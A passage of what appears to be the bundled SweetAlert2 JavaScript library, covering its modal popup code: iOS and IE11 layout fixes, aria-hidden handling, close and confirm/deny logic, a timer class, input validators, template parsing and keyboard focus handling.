
  var iOSfix = function iOSfix() {
    var iOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;

    if (iOS && !hasClass(document.body, swalClasses.iosfix)) {
      var offset = document.body.scrollTop;
      document.body.style.top = "".concat(offset * -1, "px");
      addClass(document.body, swalClasses.iosfix);
      lockBodyScroll();
      addBottomPaddingForTallPopups(); // #1948
    }
  };

  var addBottomPaddingForTallPopups = function addBottomPaddingForTallPopups() {
    var safari = !navigator.userAgent.match(/(CriOS|FxiOS|EdgiOS|YaBrowser|UCBrowser)/i);

    if (safari) {
      var bottomPanelHeight = 44;

      if (getPopup().scrollHeight > window.innerHeight - bottomPanelHeight) {
        getContainer().style.paddingBottom = "".concat(bottomPanelHeight, "px");
      }
    }
  };

  var lockBodyScroll = function lockBodyScroll() {
    // #1246
    var container = getContainer();
    var preventTouchMove;

    container.ontouchstart = function (e) {
      preventTouchMove = shouldPreventTouchMove(e);
    };

    container.ontouchmove = function (e) {
      if (preventTouchMove) {
        e.preventDefault();
        e.stopPropagation();
      }
    };
  };

  var shouldPreventTouchMove = function shouldPreventTouchMove(event) {
    var target = event.target;
    var container = getContainer();

    if (isStylys(event) || isZoom(event)) {
      return false;
    }

    if (target === container) {
      return true;
    }

    if (!isScrollable(container) && target.tagName !== 'INPUT' && // #1603
    !(isScrollable(getContent()) && // #1944
    getContent().contains(target))) {
      return true;
    }

    return false;
  };

  var isStylys = function isStylys(event) {
    // #1786
    return event.touches && event.touches.length && event.touches[0].touchType === 'stylus';
  };

  var isZoom = function isZoom(event) {
    // #1891
    return event.touches && event.touches.length > 1;
  };

  var undoIOSfix = function undoIOSfix() {
    if (hasClass(document.body, swalClasses.iosfix)) {
      var offset = parseInt(document.body.style.top, 10);
      removeClass(document.body, swalClasses.iosfix);
      document.body.style.top = '';
      document.body.scrollTop = offset * -1;
    }
  };

  /* istanbul ignore file */

  var isIE11 = function isIE11() {
    return !!window.MSInputMethodContext && !!document.documentMode;
  }; // Fix IE11 centering sweetalert2/issues/933


  var fixVerticalPositionIE = function fixVerticalPositionIE() {
    var container = getContainer();
    var popup = getPopup();
    container.style.removeProperty('align-items');

    if (popup.offsetTop < 0) {
      container.style.alignItems = 'flex-start';
    }
  };

  var IEfix = function IEfix() {
    if (typeof window !== 'undefined' && isIE11()) {
      fixVerticalPositionIE();
      window.addEventListener('resize', fixVerticalPositionIE);
    }
  };
  var undoIEfix = function undoIEfix() {
    if (typeof window !== 'undefined' && isIE11()) {
      window.removeEventListener('resize', fixVerticalPositionIE);
    }
  };

  // Adding aria-hidden="true" to elements outside of the active modal dialog ensures that
  // elements not within the active modal dialog will not be surfaced if a user opens a screen
  // reader’s list of elements (headings, form controls, landmarks, etc.) in the document.

  var setAriaHidden = function setAriaHidden() {
    var bodyChildren = toArray(document.body.children);
    bodyChildren.forEach(function (el) {
      if (el === getContainer() || contains(el, getContainer())) {
        return;
      }

      if (el.hasAttribute('aria-hidden')) {
        el.setAttribute('data-previous-aria-hidden', el.getAttribute('aria-hidden'));
      }

      el.setAttribute('aria-hidden', 'true');
    });
  };
  var unsetAriaHidden = function unsetAriaHidden() {
    var bodyChildren = toArray(document.body.children);
    bodyChildren.forEach(function (el) {
      if (el.hasAttribute('data-previous-aria-hidden')) {
        el.setAttribute('aria-hidden', el.getAttribute('data-previous-aria-hidden'));
        el.removeAttribute('data-previous-aria-hidden');
      } else {
        el.removeAttribute('aria-hidden');
      }
    });
  };

  /**
   * This module containts `WeakMap`s for each effectively-"private  property" that a `Swal` has.
   * For example, to set the private property "foo" of `this` to "bar", you can `privateProps.foo.set(this, 'bar')`
   * This is the approach that Babel will probably take to implement private methods/fields
   *   https://github.com/tc39/proposal-private-methods
   *   https://github.com/babel/babel/pull/7555
   * Once we have the changes from that PR in Babel, and our core class fits reasonable in *one module*
   *   then we can use that language feature.
   */
  var privateMethods = {
    swalPromiseResolve: new WeakMap()
  };

  /*
   * Instance method to close sweetAlert
   */

  function removePopupAndResetState(instance, container, isToast$$1, didClose) {
    if (isToast$$1) {
      triggerDidCloseAndDispose(instance, didClose);
    } else {
      restoreActiveElement().then(function () {
        return triggerDidCloseAndDispose(instance, didClose);
      });
      globalState.keydownTarget.removeEventListener('keydown', globalState.keydownHandler, {
        capture: globalState.keydownListenerCapture
      });
      globalState.keydownHandlerAdded = false;
    }

    if (container.parentNode && !document.body.getAttribute('data-swal2-queue-step')) {
      container.parentNode.removeChild(container);
    }

    if (isModal()) {
      undoScrollbar();
      undoIOSfix();
      undoIEfix();
      unsetAriaHidden();
    }

    removeBodyClasses();
  }

  function removeBodyClasses() {
    removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses['height-auto'], swalClasses['no-backdrop'], swalClasses['toast-shown'], swalClasses['toast-column']]);
  }

  function close(resolveValue) {
    var popup = getPopup();

    if (!popup) {
      return;
    }

    resolveValue = prepareResolveValue(resolveValue);
    var innerParams = privateProps.innerParams.get(this);

    if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
      return;
    }

    var swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
    removeClass(popup, innerParams.showClass.popup);
    addClass(popup, innerParams.hideClass.popup);
    var backdrop = getContainer();
    removeClass(backdrop, innerParams.showClass.backdrop);
    addClass(backdrop, innerParams.hideClass.backdrop);
    handlePopupAnimation(this, popup, innerParams); // Resolve Swal promise

    swalPromiseResolve(resolveValue);
  }

  var prepareResolveValue = function prepareResolveValue(resolveValue) {
    // When user calls Swal.close()
    if (typeof resolveValue === 'undefined') {
      return {
        isConfirmed: false,
        isDenied: false,
        isDismissed: true
      };
    }

    return _extends({
      isConfirmed: false,
      isDenied: false,
      isDismissed: false
    }, resolveValue);
  };

  var handlePopupAnimation = function handlePopupAnimation(instance, popup, innerParams) {
    var container = getContainer(); // If animation is supported, animate

    var animationIsSupported = animationEndEvent && hasCssAnimation(popup);
    var onClose = innerParams.onClose,
        onAfterClose = innerParams.onAfterClose,
        willClose = innerParams.willClose,
        didClose = innerParams.didClose;
    runDidClose(popup, willClose, onClose);

    if (animationIsSupported) {
      animatePopup(instance, popup, container, didClose || onAfterClose);
    } else {
      // Otherwise, remove immediately
      removePopupAndResetState(instance, container, isToast(), didClose || onAfterClose);
    }
  };

  var runDidClose = function runDidClose(popup, willClose, onClose) {
    if (willClose !== null && typeof willClose === 'function') {
      willClose(popup);
    } else if (onClose !== null && typeof onClose === 'function') {
      onClose(popup); // @deprecated
    }
  };

  var animatePopup = function animatePopup(instance, popup, container, didClose) {
    globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, isToast(), didClose);
    popup.addEventListener(animationEndEvent, function (e) {
      if (e.target === popup) {
        globalState.swalCloseEventFinishedCallback();
        delete globalState.swalCloseEventFinishedCallback;
      }
    });
  };

  var triggerDidCloseAndDispose = function triggerDidCloseAndDispose(instance, didClose) {
    setTimeout(function () {
      if (typeof didClose === 'function') {
        didClose();
      }

      instance._destroy();
    });
  };

  function setButtonsDisabled(instance, buttons, disabled) {
    var domCache = privateProps.domCache.get(instance);
    buttons.forEach(function (button) {
      domCache[button].disabled = disabled;
    });
  }

  function setInputDisabled(input, disabled) {
    if (!input) {
      return false;
    }

    if (input.type === 'radio') {
      var radiosContainer = input.parentNode.parentNode;
      var radios = radiosContainer.querySelectorAll('input');

      for (var i = 0; i < radios.length; i++) {
        radios[i].disabled = disabled;
      }
    } else {
      input.disabled = disabled;
    }
  }

  function enableButtons() {
    setButtonsDisabled(this, ['confirmButton', 'denyButton', 'cancelButton'], false);
  }
  function disableButtons() {
    setButtonsDisabled(this, ['confirmButton', 'denyButton', 'cancelButton'], true);
  }
  function enableInput() {
    return setInputDisabled(this.getInput(), false);
  }
  function disableInput() {
    return setInputDisabled(this.getInput(), true);
  }

  function showValidationMessage(error) {
    var domCache = privateProps.domCache.get(this);
    var params = privateProps.innerParams.get(this);
    setInnerHtml(domCache.validationMessage, error);
    domCache.validationMessage.className = swalClasses['validation-message'];

    if (params.customClass && params.customClass.validationMessage) {
      addClass(domCache.validationMessage, params.customClass.validationMessage);
    }

    show(domCache.validationMessage);
    var input = this.getInput();

    if (input) {
      input.setAttribute('aria-invalid', true);
      input.setAttribute('aria-describedBy', swalClasses['validation-message']);
      focusInput(input);
      addClass(input, swalClasses.inputerror);
    }
  } // Hide block with validation message

  function resetValidationMessage$1() {
    var domCache = privateProps.domCache.get(this);

    if (domCache.validationMessage) {
      hide(domCache.validationMessage);
    }

    var input = this.getInput();

    if (input) {
      input.removeAttribute('aria-invalid');
      input.removeAttribute('aria-describedBy');
      removeClass(input, swalClasses.inputerror);
    }
  }

  function getProgressSteps$1() {
    var domCache = privateProps.domCache.get(this);
    return domCache.progressSteps;
  }

  var Timer = /*#__PURE__*/function () {
    function Timer(callback, delay) {
      _classCallCheck(this, Timer);

      this.callback = callback;
      this.remaining = delay;
      this.running = false;
      this.start();
    }

    _createClass(Timer, [{
      key: "start",
      value: function start() {
        if (!this.running) {
          this.running = true;
          this.started = new Date();
          this.id = setTimeout(this.callback, this.remaining);
        }

        return this.remaining;
      }
    }, {
      key: "stop",
      value: function stop() {
        if (this.running) {
          this.running = false;
          clearTimeout(this.id);
          this.remaining -= new Date() - this.started;
        }

        return this.remaining;
      }
    }, {
      key: "increase",
      value: function increase(n) {
        var running = this.running;

        if (running) {
          this.stop();
        }

        this.remaining += n;

        if (running) {
          this.start();
        }

        return this.remaining;
      }
    }, {
      key: "getTimerLeft",
      value: function getTimerLeft() {
        if (this.running) {
          this.stop();
          this.start();
        }

        return this.remaining;
      }
    }, {
      key: "isRunning",
      value: function isRunning() {
        return this.running;
      }
    }]);

    return Timer;
  }();

  var defaultInputValidators = {
    email: function email(string, validationMessage) {
      return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || 'Invalid email address');
    },
    url: function url(string, validationMessage) {
      // taken from https://stackoverflow.com/a/3809435 with a small change from #1306 and #2013
      return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || 'Invalid URL');
    }
  };

  function setDefaultInputValidators(params) {
    // Use default `inputValidator` for supported input types if not provided
    if (!params.inputValidator) {
      Object.keys(defaultInputValidators).forEach(function (key) {
        if (params.input === key) {
          params.inputValidator = defaultInputValidators[key];
        }
      });
    }
  }

  function validateCustomTargetElement(params) {
    // Determine if the custom target element is valid
    if (!params.target || typeof params.target === 'string' && !document.querySelector(params.target) || typeof params.target !== 'string' && !params.target.appendChild) {
      warn('Target parameter is not valid, defaulting to "body"');
      params.target = 'body';
    }
  }
  /**
   * Set type, text and actions on popup
   *
   * @param params
   * @returns {boolean}
   */


  function setParameters(params) {
    setDefaultInputValidators(params); // showLoaderOnConfirm && preConfirm

    if (params.showLoaderOnConfirm && !params.preConfirm) {
      warn('showLoaderOnConfirm is set to true, but preConfirm is not defined.\n' + 'showLoaderOnConfirm should be used together with preConfirm, see usage example:\n' + 'https://sweetalert2.github.io/#ajax-request');
    } // params.animation will be actually used in renderPopup.js
    // but in case when params.animation is a function, we need to call that function
    // before popup (re)initialization, so it'll be possible to check Swal.isVisible()
    // inside the params.animation function


    params.animation = callIfFunction(params.animation);
    validateCustomTargetElement(params); // Replace newlines with <br> in title

    if (typeof params.title === 'string') {
      params.title = params.title.split('\n').join('<br />');
    }

    init(params);
  }

  var swalStringParams = ['swal-title', 'swal-html', 'swal-footer'];
  var getTemplateParams = function getTemplateParams(params) {
    var template = typeof params.template === 'string' ? document.querySelector(params.template) : params.template;

    if (!template) {
      return {};
    }

    var templateContent = template.content || template; // IE11

    showWarningsForElements(templateContent);

    var result = _extends(getSwalParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));

    return result;
  };

  var getSwalParams = function getSwalParams(templateContent) {
    var result = {};
    toArray(templateContent.querySelectorAll('swal-param')).forEach(function (param) {
      showWarningsForAttributes(param, ['name', 'value']);
      var paramName = param.getAttribute('name');
      var value = param.getAttribute('value');

      if (typeof defaultParams[paramName] === 'boolean' && value === 'false') {
        value = false;
      }

      if (_typeof(defaultParams[paramName]) === 'object') {
        value = JSON.parse(value);
      }

      result[paramName] = value;
    });
    return result;
  };

  var getSwalButtons = function getSwalButtons(templateContent) {
    var result = {};
    toArray(templateContent.querySelectorAll('swal-button')).forEach(function (button) {
      showWarningsForAttributes(button, ['type', 'color', 'aria-label']);
      var type = button.getAttribute('type');
      result["".concat(type, "ButtonText")] = button.innerHTML;
      result["show".concat(capitalizeFirstLetter(type), "Button")] = true;

      if (button.hasAttribute('color')) {
        result["".concat(type, "ButtonColor")] = button.getAttribute('color');
      }

      if (button.hasAttribute('aria-label')) {
        result["".concat(type, "ButtonAriaLabel")] = button.getAttribute('aria-label');
      }
    });
    return result;
  };

  var getSwalImage = function getSwalImage(templateContent) {
    var result = {};
    var image = templateContent.querySelector('swal-image');

    if (image) {
      showWarningsForAttributes(image, ['src', 'width', 'height', 'alt']);

      if (image.hasAttribute('src')) {
        result.imageUrl = image.getAttribute('src');
      }

      if (image.hasAttribute('width')) {
        result.imageWidth = image.getAttribute('width');
      }

      if (image.hasAttribute('height')) {
        result.imageHeight = image.getAttribute('height');
      }

      if (image.hasAttribute('alt')) {
        result.imageAlt = image.getAttribute('alt');
      }
    }

    return result;
  };

  var getSwalIcon = function getSwalIcon(templateContent) {
    var result = {};
    var icon = templateContent.querySelector('swal-icon');

    if (icon) {
      showWarningsForAttributes(icon, ['type', 'color']);

      if (icon.hasAttribute('type')) {
        result.icon = icon.getAttribute('type');
      }

      if (icon.hasAttribute('color')) {
        result.iconColor = icon.getAttribute('color');
      }

      result.iconHtml = icon.innerHTML;
    }

    return result;
  };

  var getSwalInput = function getSwalInput(templateContent) {
    var result = {};
    var input = templateContent.querySelector('swal-input');

    if (input) {
      showWarningsForAttributes(input, ['type', 'label', 'placeholder', 'value']);
      result.input = input.getAttribute('type') || 'text';

      if (input.hasAttribute('label')) {
        result.inputLabel = input.getAttribute('label');
      }

      if (input.hasAttribute('placeholder')) {
        result.inputPlaceholder = input.getAttribute('placeholder');
      }

      if (input.hasAttribute('value')) {
        result.inputValue = input.getAttribute('value');
      }
    }

    var inputOptions = templateContent.querySelectorAll('swal-input-option');

    if (inputOptions.length) {
      result.inputOptions = {};
      toArray(inputOptions).forEach(function (option) {
        showWarningsForAttributes(option, ['value']);
        var optionValue = option.getAttribute('value');
        var optionName = option.innerHTML;
        result.inputOptions[optionValue] = optionName;
      });
    }

    return result;
  };

  var getSwalStringParams = function getSwalStringParams(templateContent, paramNames) {
    var result = {};

    for (var i in paramNames) {
      var paramName = paramNames[i];
      var tag = templateContent.querySelector(paramName);

      if (tag) {
        showWarningsForAttributes(tag, []);
        result[paramName.replace(/^swal-/, '')] = tag.innerHTML;
      }
    }

    return result;
  };

  var showWarningsForElements = function showWarningsForElements(template) {
    var allowedElements = swalStringParams.concat(['swal-param', 'swal-button', 'swal-image', 'swal-icon', 'swal-input', 'swal-input-option']);
    toArray(template.querySelectorAll('*')).forEach(function (el) {
      if (el.parentNode !== template) {
        // can't use template.children because of IE11
        return;
      }

      var tagName = el.tagName.toLowerCase();

      if (allowedElements.indexOf(tagName) === -1) {
        warn("Unrecognized element <".concat(tagName, ">"));
      }
    });
  };

  var showWarningsForAttributes = function showWarningsForAttributes(el, allowedAttributes) {
    toArray(el.attributes).forEach(function (attribute) {
      if (allowedAttributes.indexOf(attribute.name) === -1) {
        warn(["Unrecognized attribute \"".concat(attribute.name, "\" on <").concat(el.tagName.toLowerCase(), ">."), "".concat(allowedAttributes.length ? "Allowed attributes are: ".concat(allowedAttributes.join(', ')) : 'To set the value, use HTML within the element.')]);
      }
    });
  };

  var SHOW_CLASS_TIMEOUT = 10;
  /**
   * Open popup, add necessary classes and styles, fix scrollbar
   *
   * @param params
   */

  var openPopup = function openPopup(params) {
    var container = getContainer();
    var popup = getPopup();

    if (typeof params.willOpen === 'function') {
      params.willOpen(popup);
    } else if (typeof params.onBeforeOpen === 'function') {
      params.onBeforeOpen(popup); // @deprecated
    }

    var bodyStyles = window.getComputedStyle(document.body);
    var initialBodyOverflow = bodyStyles.overflowY;
    addClasses$1(container, popup, params); // scrolling is 'hidden' until animation is done, after that 'auto'

    setTimeout(function () {
      setScrollingVisibility(container, popup);
    }, SHOW_CLASS_TIMEOUT);

    if (isModal()) {
      fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
      setAriaHidden();
    }

    if (!isToast() && !globalState.previousActiveElement) {
      globalState.previousActiveElement = document.activeElement;
    }

    runDidOpen(popup, params);
    removeClass(container, swalClasses['no-transition']);
  };

  var runDidOpen = function runDidOpen(popup, params) {
    if (typeof params.didOpen === 'function') {
      setTimeout(function () {
        return params.didOpen(popup);
      });
    } else if (typeof params.onOpen === 'function') {
      setTimeout(function () {
        return params.onOpen(popup);
      }); // @deprecated
    }
  };

  var swalOpenAnimationFinished = function swalOpenAnimationFinished(event) {
    var popup = getPopup();

    if (event.target !== popup) {
      return;
    }

    var container = getContainer();
    popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished);
    container.style.overflowY = 'auto';
  };

  var setScrollingVisibility = function setScrollingVisibility(container, popup) {
    if (animationEndEvent && hasCssAnimation(popup)) {
      container.style.overflowY = 'hidden';
      popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
    } else {
      container.style.overflowY = 'auto';
    }
  };

  var fixScrollContainer = function fixScrollContainer(container, scrollbarPadding, initialBodyOverflow) {
    iOSfix();
    IEfix();

    if (scrollbarPadding && initialBodyOverflow !== 'hidden') {
      fixScrollbar();
    } // sweetalert2/issues/1247


    setTimeout(function () {
      container.scrollTop = 0;
    });
  };

  var addClasses$1 = function addClasses(container, popup, params) {
    addClass(container, params.showClass.backdrop); // the workaround with setting/unsetting opacity is needed for #2019 and 2059

    popup.style.setProperty('opacity', '0', 'important');
    show(popup);
    setTimeout(function () {
      // Animate popup right after showing it
      addClass(popup, params.showClass.popup); // and remove the opacity workaround

      popup.style.removeProperty('opacity');
    }, SHOW_CLASS_TIMEOUT); // 10ms in order to fix #2062

    addClass([document.documentElement, document.body], swalClasses.shown);

    if (params.heightAuto && params.backdrop && !params.toast) {
      addClass([document.documentElement, document.body], swalClasses['height-auto']);
    }
  };

  var handleInputOptionsAndValue = function handleInputOptionsAndValue(instance, params) {
    if (params.input === 'select' || params.input === 'radio') {
      handleInputOptions(instance, params);
    } else if (['text', 'email', 'number', 'tel', 'textarea'].indexOf(params.input) !== -1 && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
      handleInputValue(instance, params);
    }
  };
  var getInputValue = function getInputValue(instance, innerParams) {
    var input = instance.getInput();

    if (!input) {
      return null;
    }

    switch (innerParams.input) {
      case 'checkbox':
        return getCheckboxValue(input);

      case 'radio':
        return getRadioValue(input);

      case 'file':
        return getFileValue(input);

      default:
        return innerParams.inputAutoTrim ? input.value.trim() : input.value;
    }
  };

  var getCheckboxValue = function getCheckboxValue(input) {
    return input.checked ? 1 : 0;
  };

  var getRadioValue = function getRadioValue(input) {
    return input.checked ? input.value : null;
  };

  var getFileValue = function getFileValue(input) {
    return input.files.length ? input.getAttribute('multiple') !== null ? input.files : input.files[0] : null;
  };

  var handleInputOptions = function handleInputOptions(instance, params) {
    var content = getContent();

    var processInputOptions = function processInputOptions(inputOptions) {
      return populateInputOptions[params.input](content, formatInputOptions(inputOptions), params);
    };

    if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
      showLoading(getConfirmButton());
      asPromise(params.inputOptions).then(function (inputOptions) {
        instance.hideLoading();
        processInputOptions(inputOptions);
      });
    } else if (_typeof(params.inputOptions) === 'object') {
      processInputOptions(params.inputOptions);
    } else {
      error("Unexpected type of inputOptions! Expected object, Map or Promise, got ".concat(_typeof(params.inputOptions)));
    }
  };

  var handleInputValue = function handleInputValue(instance, params) {
    var input = instance.getInput();
    hide(input);
    asPromise(params.inputValue).then(function (inputValue) {
      input.value = params.input === 'number' ? parseFloat(inputValue) || 0 : "".concat(inputValue);
      show(input);
      input.focus();
      instance.hideLoading();
    })["catch"](function (err) {
      error("Error in inputValue promise: ".concat(err));
      input.value = '';
      show(input);
      input.focus();
      instance.hideLoading();
    });
  };

  var populateInputOptions = {
    select: function select(content, inputOptions, params) {
      var select = getChildByClass(content, swalClasses.select);

      var renderOption = function renderOption(parent, optionLabel, optionValue) {
        var option = document.createElement('option');
        option.value = optionValue;
        setInnerHtml(option, optionLabel);
        option.selected = isSelected(optionValue, params.inputValue);
        parent.appendChild(option);
      };

      inputOptions.forEach(function (inputOption) {
        var optionValue = inputOption[0];
        var optionLabel = inputOption[1]; // <optgroup> spec:
        // https://www.w3.org/TR/html401/interact/forms.html#h-17.6
        // "...all OPTGROUP elements must be specified directly within a SELECT element (i.e., groups may not be nested)..."
        // check whether this is a <optgroup>

        if (Array.isArray(optionLabel)) {
          // if it is an array, then it is an <optgroup>
          var optgroup = document.createElement('optgroup');
          optgroup.label = optionValue;
          optgroup.disabled = false; // not configurable for now

          select.appendChild(optgroup);
          optionLabel.forEach(function (o) {
            return renderOption(optgroup, o[1], o[0]);
          });
        } else {
          // case of <option>
          renderOption(select, optionLabel, optionValue);
        }
      });
      select.focus();
    },
    radio: function radio(content, inputOptions, params) {
      var radio = getChildByClass(content, swalClasses.radio);
      inputOptions.forEach(function (inputOption) {
        var radioValue = inputOption[0];
        var radioLabel = inputOption[1];
        var radioInput = document.createElement('input');
        var radioLabelElement = document.createElement('label');
        radioInput.type = 'radio';
        radioInput.name = swalClasses.radio;
        radioInput.value = radioValue;

        if (isSelected(radioValue, params.inputValue)) {
          radioInput.checked = true;
        }

        var label = document.createElement('span');
        setInnerHtml(label, radioLabel);
        label.className = swalClasses.label;
        radioLabelElement.appendChild(radioInput);
        radioLabelElement.appendChild(label);
        radio.appendChild(radioLabelElement);
      });
      var radios = radio.querySelectorAll('input');

      if (radios.length) {
        radios[0].focus();
      }
    }
  };
  /**
   * Converts `inputOptions` into an array of `[value, label]`s
   * @param inputOptions
   */

  var formatInputOptions = function formatInputOptions(inputOptions) {
    var result = [];

    if (typeof Map !== 'undefined' && inputOptions instanceof Map) {
      inputOptions.forEach(function (value, key) {
        var valueFormatted = value;

        if (_typeof(valueFormatted) === 'object') {
          // case of <optgroup>
          valueFormatted = formatInputOptions(valueFormatted);
        }

        result.push([key, valueFormatted]);
      });
    } else {
      Object.keys(inputOptions).forEach(function (key) {
        var valueFormatted = inputOptions[key];

        if (_typeof(valueFormatted) === 'object') {
          // case of <optgroup>
          valueFormatted = formatInputOptions(valueFormatted);
        }

        result.push([key, valueFormatted]);
      });
    }

    return result;
  };

  var isSelected = function isSelected(optionValue, inputValue) {
    return inputValue && inputValue.toString() === optionValue.toString();
  };

  var handleConfirmButtonClick = function handleConfirmButtonClick(instance, innerParams) {
    instance.disableButtons();

    if (innerParams.input) {
      handleConfirmOrDenyWithInput(instance, innerParams, 'confirm');
    } else {
      confirm(instance, innerParams, true);
    }
  };
  var handleDenyButtonClick = function handleDenyButtonClick(instance, innerParams) {
    instance.disableButtons();

    if (innerParams.returnInputValueOnDeny) {
      handleConfirmOrDenyWithInput(instance, innerParams, 'deny');
    } else {
      deny(instance, innerParams, false);
    }
  };
  var handleCancelButtonClick = function handleCancelButtonClick(instance, dismissWith) {
    instance.disableButtons();
    dismissWith(DismissReason.cancel);
  };

  var handleConfirmOrDenyWithInput = function handleConfirmOrDenyWithInput(instance, innerParams, type
  /* type is either 'confirm' or 'deny' */
  ) {
    var inputValue = getInputValue(instance, innerParams);

    if (innerParams.inputValidator) {
      handleInputValidator(instance, innerParams, inputValue);
    } else if (!instance.getInput().checkValidity()) {
      instance.enableButtons();
      instance.showValidationMessage(innerParams.validationMessage);
    } else if (type === 'deny') {
      deny(instance, innerParams, inputValue);
    } else {
      confirm(instance, innerParams, inputValue);
    }
  };

  var handleInputValidator = function handleInputValidator(instance, innerParams, inputValue) {
    instance.disableInput();
    var validationPromise = Promise.resolve().then(function () {
      return asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage));
    });
    validationPromise.then(function (validationMessage) {
      instance.enableButtons();
      instance.enableInput();

      if (validationMessage) {
        instance.showValidationMessage(validationMessage);
      } else {
        confirm(instance, innerParams, inputValue);
      }
    });
  };

  var deny = function deny(instance, innerParams, value) {
    if (innerParams.showLoaderOnDeny) {
      showLoading(getDenyButton());
    }

    if (innerParams.preDeny) {
      var preDenyPromise = Promise.resolve().then(function () {
        return asPromise(innerParams.preDeny(value, innerParams.validationMessage));
      });
      preDenyPromise.then(function (preDenyValue) {
        if (preDenyValue === false) {
          instance.hideLoading();
        } else {
          instance.closePopup({
            isDenied: true,
            value: typeof preDenyValue === 'undefined' ? value : preDenyValue
          });
        }
      });
    } else {
      instance.closePopup({
        isDenied: true,
        value: value
      });
    }
  };

  var succeedWith = function succeedWith(instance, value) {
    instance.closePopup({
      isConfirmed: true,
      value: value
    });
  };

  var confirm = function confirm(instance, innerParams, value) {
    if (innerParams.showLoaderOnConfirm) {
      showLoading(); // TODO: make showLoading an *instance* method
    }

    if (innerParams.preConfirm) {
      instance.resetValidationMessage();
      var preConfirmPromise = Promise.resolve().then(function () {
        return asPromise(innerParams.preConfirm(value, innerParams.validationMessage));
      });
      preConfirmPromise.then(function (preConfirmValue) {
        if (isVisible(getValidationMessage()) || preConfirmValue === false) {
          instance.hideLoading();
        } else {
          succeedWith(instance, typeof preConfirmValue === 'undefined' ? value : preConfirmValue);
        }
      });
    } else {
      succeedWith(instance, value);
    }
  };

  var addKeydownHandler = function addKeydownHandler(instance, globalState, innerParams, dismissWith) {
    if (globalState.keydownTarget && globalState.keydownHandlerAdded) {
      globalState.keydownTarget.removeEventListener('keydown', globalState.keydownHandler, {
        capture: globalState.keydownListenerCapture
      });
      globalState.keydownHandlerAdded = false;
    }

    if (!innerParams.toast) {
      globalState.keydownHandler = function (e) {
        return keydownHandler(instance, e, dismissWith);
      };

      globalState.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
      globalState.keydownListenerCapture = innerParams.keydownListenerCapture;
      globalState.keydownTarget.addEventListener('keydown', globalState.keydownHandler, {
        capture: globalState.keydownListenerCapture
      });
      globalState.keydownHandlerAdded = true;
    }
  }; // Focus handling

  var setFocus = function setFocus(innerParams, index, increment) {
    var focusableElements = getFocusableElements(); // search for visible elements and select the next possible match

    if (focusableElements.length) {
      index = index + increment; // rollover to first item

      if (index === focusableElements.length) {
        index = 0; // go to last item
      } else if (index === -1) {
        index = focusableElements.length - 1;
      }

      return focusableElements[index].focus();
    } // no visible focusable elements, focus the popup


    getPopup().focus();
  };
  var arrowKeysNextButton = ['ArrowRight', 'ArrowDown', 'Right', 'Down' // IE11
  ];
  var arrowKeysPreviousButton = ['ArrowLeft', 'ArrowUp', 'Left', 'Up' // IE11
  ];
  var escKeys = ['Escape', 'Esc' // IE11
  ];

  var keydownHandler = function keydownHandler(instance, e, dismissWith) {
    var innerParams = privateProps.innerParams.get(instance);

    if (innerParams.stopKeydownPropagation) {
      e.stopPropagation();
    } // ENTER


    if (e.key === 'Enter') {
      handleEnter(instance, e, innerParams); // TAB
    } else if (e.key === 'Tab') {
      handleTab(e, innerParams); // ARROWS - switch focus between buttons
    } else if ([].concat(arrowKeysNextButton, arrowKeysPreviousButton).indexOf(e.key) !== -1) {
      handleArrows(e.key); // ESC
    } else if (escKeys.indexOf(e.key) !== -1) {
      handleEsc(e, innerParams, dismissWith);
    }
  };

  var handleEnter = function handleEnter(instance, e, innerParams) {
    // #720 #721
    if (e.isComposing) {
      return;
    }

    if (e.target && instance.getInput() && e.target.outerHTML === instance.getInput().outerHTML) {
      if (['textarea', 'file'].indexOf(innerParams.input) !== -1) {
        return; // do not submit
      }

      clickConfirm();
      e.preventDefault();
    }
  };

  var handleTab = function handleTab(e, innerParams) {
    var targetElement = e.target;
    var focusableElements = getFocusableElements();
    var btnIndex = -1;

    for (var i = 0; i < focusableElements.length; i++) {
      if (targetElement === focusableElements[i]) {
        btnIndex = i;
        break;
      }
    }

    if (!e.shiftKey) {
      // Cycle to the next button
      setFocus(innerParams, btnIndex, 1);
    } else {
      // Cycle to the prev button
      setFocus(innerParams, btnIndex, -1);
    }

    e.stopPropagation();
    e.preventDefault();
  };

  var handleArrows = function handleArrows(key) {
    var confirmButton = getConfirmButton();
    var denyButton = getDenyButton();
    var cancelButton = getCancelButton();

    if (!([confirmButton, denyButton, cancelButton].indexOf(document.activeElement) !== -1)) {
      return;
    }

    var sibling = arrowKeysNextButton.indexOf(key) !== -1 ? 'nextElementSibling' : 'previousElementSibling';
    var buttonToFocus = document.activeElement[sibling];

    if (buttonToFocus) {
      buttonToFocus.focus();
    }
  };

  var handleEsc = function handleEsc(e, innerParams, dismissWith) {
    if (callIfFunction(innerParams.allowEscapeKey)) {
      e.preventDefault();
      dismissWith(DismissReason.esc);
    }
  };

  var handlePopupClick = function handlePopupClick(instance, domCache, dismissWith) {
    var innerParams = privateProps.innerParams.get(instance);

    if (innerParams.toast) {
      handleToastClick(instance, domCache, dismissWith);
    } else {
      // Ignore click events that had mousedown on the popup but mouseup on the container
      // This can happen when the user drags a slider
      handleModalMousedown(domCache); // Ignore click events that had mousedown on the container but mouseup on the popup

      handleContainerMousedown(domCache);
      handleModalClick(instance, domCache, dismissWith);
    }
  };

